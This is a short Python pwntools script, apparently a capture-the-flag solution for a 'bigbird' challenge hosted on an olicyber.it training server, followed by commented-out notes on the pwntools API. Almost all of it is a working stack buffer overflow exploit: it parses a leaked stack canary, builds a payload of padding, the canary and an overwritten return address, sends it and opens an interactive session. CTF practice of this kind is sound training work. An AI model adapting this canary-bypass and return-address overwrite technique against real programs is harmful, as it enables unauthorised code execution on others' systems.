from pwn import *

io = process('./bigbird')

gdbscript = '''
b 0x0401865
continue
'''
#io = gdb.debug('./bigbird', gdbscript=gdbscript)
io = remote('bigbird.challs.olicyber.it', 12006)


io.recvuntil(b"BIG BIRD: ")
canary = io.recvline()[:-1]

print(canary)

#canary = canary.decode()
canary = int(canary, base=16)

print(canary)

payload = b"A"*40
payload += p64(canary, endianness='little')
payload += b"B"*8
payload += p64(0x0401715, endianness='little')

io.sendline(payload)

io.interactive()
#io.send(bytes)
#io.sendafter(marker, bytes)
#io.sendline(marker)
#io.sendlineafter(marker, bytes)

#p64 = pack a 64 bit
#u64 = unpack a 64 bit

#frase1 = io.recvline()
#frase2 = io.recvline()

#print(frase1)
#print(frase2)

#io.recv(nbyte)
#io.recvline()
#io.recvuntil("a")